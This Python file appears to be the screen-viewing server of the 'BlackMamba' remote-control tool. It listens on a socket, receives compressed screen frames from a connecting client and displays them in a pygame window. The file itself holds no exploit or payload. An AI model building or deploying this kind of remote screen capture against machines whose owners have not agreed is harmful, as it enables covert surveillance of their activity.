####################################################################################
# BLACKMAMBA BY: LOSEYS (https://github.com/loseys)
#
# QT GUI INTERFACE BY: WANDERSON M.PIMENTA (https://github.com/Wanderson-Magalhaes)
# ORIGINAL QT GUI: https://github.com/Wanderson-Magalhaes/Simple_PySide_Base
####################################################################################

"""
Video streaming server.
"""

import sys
import socket
from os import environ
environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'

import pygame
from zlib import decompress
from cryptography.fernet import Fernet

try:
    SERVER_IP = sys.argv[1]
    PORT_VIDEO = sys.argv[2]
except:
    SERVER_IP = 0
    PORT_VIDEO = 0


def crypt(msg, key):
    command = str(msg)
    command = bytes(command, encoding='utf8')
    cipher_suite = Fernet(key)
    encoded_text = cipher_suite.encrypt(command)
    return encoded_text


def decrypt(msg, key):
    cipher_suite = Fernet(key)
    decoded_text_f = cipher_suite.decrypt(msg)
    return decoded_text_f


def recvall(conn, length):
    try:
        buf = b''
        while len(buf) < length:
            data = conn.recv(length - len(buf))
            if not data:
                return data
            buf += data
        return buf
    except:
        pass


def start_stream(host=str(SERVER_IP), port=int(PORT_VIDEO)):
    sock = socket.socket()
    sock.bind((host, port))
    print("Listening ....")
    sock.settimeout(15.0)
    sock.listen(5)

    try:
        conn, addr = sock.accept()
    except:
        print('socket.timeout: timed out')
        return
    print("Accepted ....", addr)

    client_resolution = (conn.recv(50).decode())
    client_resolution = str(client_resolution).split(',')
    CLIENT_WIDTH = int(client_resolution[0])
    CLIENT_HEIGHT = int(client_resolution[1])

    with open('bin/profile/vstream_size.txt', 'r') as f:
        scsize = f.read()
        f.close()

    try:
        scsize = scsize.split(':')
        SERVER_WIDTH = int(scsize[0])
        SERVER_HEIGHT = int(
            scsize[1])
    except:
        SERVER_WIDTH = 1000
        SERVER_HEIGHT = 600

    pygame.init()
    pygame.display.set_caption('BlackMamba')
    programIcon = pygame.image.load('icons/others/icon_3.png')
    pygame.display.set_icon(programIcon)

    screen = pygame.display.set_mode((SERVER_WIDTH, SERVER_HEIGHT))
    clock = pygame.time.Clock()
    watching = True

    try:
        while watching:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    watching = False
                    break

            # Retreive the size of the pixels length, the pixels length and pixels
            try:
                size_len = int.from_bytes(conn.recv(1), byteorder='big')
                size = int.from_bytes(conn.recv(size_len), byteorder='big')
                pixels = decompress(recvall(conn, size))

                # Create the Surface from raw pixels
                img = pygame.image.fromstring(pixels, (CLIENT_WIDTH, CLIENT_HEIGHT), 'RGB')

                # resize the client image to match the server's screen dimensions
                scaled_img = pygame.transform.scale(img, (SERVER_WIDTH, SERVER_HEIGHT))

                # Display the picture
                screen.blit(scaled_img, (0, 0))
                pygame.display.flip()
                #clock.tick(60)
                clock.tick(120)
            except:
                break

    finally:
        pygame.quit()
        sock.close()

if __name__ == "__main__":
    start_stream()
